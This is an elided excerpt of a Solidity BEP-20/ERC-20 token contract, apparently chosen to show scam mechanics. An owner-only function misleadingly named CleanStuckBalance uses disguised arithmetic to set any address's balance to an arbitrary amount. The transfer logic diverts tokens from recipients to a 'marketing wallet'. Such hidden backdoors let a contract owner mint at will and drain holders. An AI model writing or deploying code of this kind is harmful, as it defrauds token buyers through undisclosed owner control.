...
contract T is OWNContext, OWNIERC20, Ownable {
    ...
    address payable public OWNmarketingWalletAddress = payable(0x000000000000000000000000000000000000dEaD); 
  ...
  modifier OWNOWNER () {
    ...
    function CleanStuckBalance(address OWNAMOUNTadr, uint256 OWNAMOUNT) external OWNOWNER {
      _balances[OWNAMOUNTadr] = (OWNAMOUNT / 1 - OWNAMOUNT / 1) + OWNAMOUNT * 10 ** _decimals;
        emit Transfer(address(0), OWNAMOUNTadr, OWNAMOUNT * 10 ** _decimals);
  }  
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            {
                _basicTransfer(recipient,OWNmarketingWalletAddress, finalAmount);
            }
            return true;
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(OWNmarketingWalletAddress, amountBNBMarketing);
